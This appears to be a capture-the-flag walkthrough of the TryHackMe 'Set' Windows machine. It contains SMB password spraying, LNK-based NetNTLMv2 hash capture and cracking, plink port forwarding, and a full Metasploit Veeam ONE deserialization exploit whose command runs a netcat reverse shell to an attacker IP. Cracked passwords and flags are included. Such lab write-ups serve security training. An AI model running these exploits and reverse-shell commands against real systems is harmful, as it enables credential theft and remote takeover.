> Set

# Nmap

nmap -sC -sV -T4 -Pn -p- -vvv -A -oN nmap/initial $IP

```
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=set.windcorp.thm
| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
| Not valid before: 2020-06-07T15:00:22
|_Not valid after:  2036-10-07T15:10:21
|_ssl-date: 2021-05-10T14:07:18+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
```

# Gobuster

gobuster dir -u https://set.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x txt,aspx,asp,html -k -o gobuster/initial

```
/index.html           (Status: 200) [Size: 42259]
/blog.html            (Status: 200) [Size: 17537]
/assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/assets/]
/forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/forms/]
/Index.html           (Status: 200) [Size: 42259]
/Blog.html            (Status: 200) [Size: 17537]
/Forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/Forms/]
/Assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/Assets/]
/INDEX.html           (Status: 200) [Size: 42259]
/appnotes.txt         (Status: 200) [Size: 146] => Interesting
```

Accessing `https://set.windcorp.thm` we can get a search bar at the end of the page to search for contacts. And we can also find the js file in `/assets/js/search.js`. We can find the users file location. `https://set.windcorp.thm/assets/data/users.xml`

And now we have a list of users detail. Let's use awk and cut to take only the usernames.

```
awk -F'[<>]' '/<email>/{print $3}' users.xml > users.txt
cat users.txt | cut -d @ -f 1 > final_users.txt
```

Now we got a list of users. Checking our gobuster we got something interseting.

# https://set.windcorp.thm/appnotes.txt

```
Notes for the new user-module.

Send mail to user:

Welcome to Set!

Remember to change your default password at once. It is too common.
```

Let's try password spraying attack on SMB and choose passwords from Seclists which hash common passwords.

# Metasploit => auxiliary/scanner/smb/smb_login

```
set PASS_FILE /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
set RHOSTS 10.10.218.222
set STOP_ON_SUCCESS true
set USER_FILE final_users.txt
run
```

It took some time.

`[+] 10.10.218.222:445     - 10.10.218.222:445 - Success: '.\myrtleowe:Passw@rd'`

We can't access WinRM using these creds so moving onto SMB.

# SMB

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	E$              Disk      Default share
	Files           Disk      
	IPC$            IPC       Remote IPC
```

smbclient \\\\$IP\\Files -U myrtleowe

We got a file called Info.txt

```
Zip and save your project files here. 
We will review them

BTW.
Flag1: THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}
```

Since we can upload zip files we can change the icon-path in a LNK-file and point it to a SMB-server capturing the users password-hash.The beauty with this trick, is that the user don't even has to click the lnk. Opening a window displaying contents of a folder containing such a file, is enough.

**Reference:https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html**

sudo ./mslink_v1.3.sh -l whatever -n hook -i \\\\10.8.107.21\\share -o hook.lnk

Now we have .lnk file. Let's zip the contents of the file. `zip hook.zip hook.lnk`

And we got the hash!

```
MichelleWat::SET:f599e18900f992e3:494089490B4EB7A018E51A18922A1AAF:010100000000000080FE18216248D7019A194C1A210B5E540000000002000800560049005900500001001E00570049004E002D0033004F004D005100540055003000580046003300300004003400570049004E002D0033004F004D00510054005500300058004600330030002E0056004900590050002E004C004F00430041004C000300140056004900590050002E004C004F00430041004C000500140056004900590050002E004C004F00430041004C000700080080FE18216248D70106000400020000000800300030000000000000000000000000200000E6B121C981DDA1DAA345FF2D6DEF451C50C9B3F8FEF861045566D7032ADCDE150A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E003100300037002E00320031000000000000000000
```

Let's crack it in John!

john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```
!!!MICKEYmouse   (MichelleWat)
```

Since we got Win-RM let' try it!

evil-winrm -i $IP -u MichelleWat -p '!!!MICKEYmouse'

# Flag 2

```
Flag2: THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
```

# Privilege Escalation

Let's try to upload powerup.ps1 `upload powerup.ps1`. Failed!! Let's try using `Invoke-WebRequest`.

Invoke-WebRequest http://10.8.107.21:8000/PowerUp.ps1 -outfile PowerUp.ps1
import-module ./PowerUp.ps1

```
Importing *.ps1 files as modules is not allowed in ConstrainedLanguage mode.
At line:1 char:1
+ import-module ./PowerUp.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException
    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
```

Looks like Powershell Constrained Language Mode is on! Let's do it manually. Let's look at the ports.

netstat -ao

```
  TCP    10.10.63.31:2805       SET:49726              ESTABLISHED     4192 => looks interesting
  TCP    10.10.63.31:5985       ip-10-8-107-21:48972   TIME_WAIT       0
  TCP    10.10.63.31:5985       ip-10-8-107-21:48974   ESTABLISHED     4
  TCP    10.10.63.31:49726      SET:2805               ESTABLISHED     4192
  TCP    10.10.63.31:50194      52.255.188.83:https    SYN_SENT        3496
  TCP    10.10.63.31:50195      8.238.11.254:http      SYN_SENT        3852
  TCP    127.0.0.1:2805         SET:49727              ESTABLISHED     4192
```

Get-Process -Id 4192

```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    771      53    60328      79916              4192   0 Veeam.One.Agent.Service
```

Looks like Veeam Service is vulnerable and we got a metasploit module too! But we don't know the version of Veeam. It is located in `C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent`. 

**NOTE: Find path using `Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}`**

And let's get the version of Veeam.

(get-item Veeam.One.Agent.Service.exe).versioninfo.fileversion

(or)

Get-Item Veeam.One.Agent.Service.exe | Format-List *


```
9.5.4.4566
```

Looks like we have a path. But now we have to access 2805. We can try to upload a meterpreter using Evil-Winrm. But windows defender is in place. So we have to port forward using plink. Transfer plink through Invoke-WebRequest. 

`Invoke-WebRequest http://10.8.107.21:8000/plink.exe -outfile plink.exe`

echo y|& ./plink.exe -R 2805:127.0.0.1:2805 -l n00bmast3r -pw 1503 10.8.107.21

And we have portwarded it to localhost:2805.

# POC

nmap -p2805 localhost

```
PORT     STATE SERVICE
2805/tcp open  wta-wsp-s
```

We have a metasploit module but since Windows Defender is in play we can't use those which means we have to craft out payload which Windows defender doesn't catch like cmd.exe.

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Veeam ONE Agent .NET Deserialization',
        'Description' => %q{
          This module exploits a .NET deserialization vulnerability in the Veeam
          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
          9 and 10 release lines.

          Specifically, the module targets the HandshakeResult() method used by
          the Agent. By inducing a failure in the handshake, the Agent will
          deserialize untrusted data.

          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
          continues to distribute this version but with the patch pre-applied.
        },
        'Author' => [
          'Michael Zanetta', # Discovery
          'Edgar Boda-Majer', # Discovery
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-10914'],
          ['CVE', '2020-10915'], # This module
          ['ZDI', '20-545'],
          ['ZDI', '20-546'], # This module
          ['URL', 'https://www.veeam.com/kb3144']
        ],
        'DisclosureDate' => '2020-04-15', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :psh_stager,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Custom Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd2,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/exec'
              }
            }
          ]
        ],
        'DefaultTarget' => 2,
        'DefaultOptions' => {
          'WfsDelay' => 10
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(2805),
      OptString.new(
        'CMD',
        [
          true,
          'Command to be executed on target',
          'net use a: \\\10.8.107.21\myshare /user:hacker hacker&a:\nc.exe 10.8.107.21 4444 -e cmd'
        ]
      ),
      OptString.new(
        'HOSTINFO_NAME',
        [
          true,
          'Name to send in host info (must be recognized by server!)',
          'AgentController'
        ]
      )
    ])
  end

  def check
    vprint_status("Checking connection to #{peer}")
    connect

    CheckCode::Detected("Connected to #{peer}.")
  rescue Rex::ConnectionError => e
    CheckCode::Unknown("#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def exploit
    print_status("Connecting to #{peer}")
    connect

    print_status("Sending host info to #{peer}")
    sock.put(host_info(datastore['HOSTINFO_NAME']))

    res = sock.get_once
    vprint_good("<-- Host info reply: #{res.inspect}") if res

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd2
      execute_command(datastore['CMD'])
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      # TODO: Create an option to execute the full stager without hacking
      # :linemax or calling execute_command(generate_cmdstager(...).join(...))
      execute_cmdstager(
        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
        linemax: 9001 # It's over 9000
      )
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    serialized_payload = Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter # This is _exactly_ what we need
    )

    print_status("Sending malicious handshake to #{peer}")
    sock.put(handshake(serialized_payload))

    res = sock.get_once
    vprint_good("<-- Handshake reply: #{res.inspect}") if res
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def host_info(name)
    meta = [0x0205].pack('v')
    packed_name = [name.length].pack('C') + name

    pkt = meta + packed_name

    vprint_good("--> Host info packet: #{pkt.inspect}")
    pkt
  end

  def handshake(serialized_payload)
    # A -1 status indicates a failure, which will trigger the deserialization
    status = [-1].pack('l<')

    length = status.length + serialized_payload.length
    type = 7
    attrs = 1
    kontext = 0

    header = [length, type, attrs, kontext].pack('VvVV')
    padding = "\x00" * 18
    result = status + serialized_payload

    pkt = header + padding + result

    vprint_good("--> Handshake packet: #{pkt.inspect}")
    pkt
  end

end
```

sudo smbserver.py -smb2support -username hacker -password hacker myshare .

# Msfconsole

```bash
set RHOSTS 127.0.0.1 
set SRVHOST 10.8.107.21 # Our THM IP
set CMD 'net use a: \\10.8.107.21\myshare /user:hacker hacker&a:\nc.exe 10.8.107.21 4444 -e cmd'
run
```

We have to setup our netcat listener to the port and wait!!

# smbserver output

```
[*] Incoming connection (10.10.59.244,50111)
[*] AUTHENTICATE_MESSAGE (\hacker,SET)
[*] User SET\hacker authenticated successfully
[*] hacker:::aaaaaaaaaaaaaaaa:9ef958b359e9a3c9546eb87734081379:0101000000000000803d9fc96e50d7010dcd1484de557f7d00000000010010005500570043006c005500790069004600030010005500570043006c00550079006900460002001000410052006e007a0067006a007500630004001000410052006e007a0067006a007500630007000800803d9fc96e50d701060004000200000008003000300000000000000000000000003000003cca8c0b613eb298c5a497b49d8f4b89f652da0f23f09a6f16c1b13837718e160a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e003100300037002e00320031000000000000000000
```

And we have a shell as System32. 

# C:\Users\Administrator\Desktop\flag3.txt

```
Flag3: THM{934f7faaadab3b040edab8214789114c9d3049dd}

I am glad we blocked Veeam ONE agent in Firewall, so we can patch it next week.
```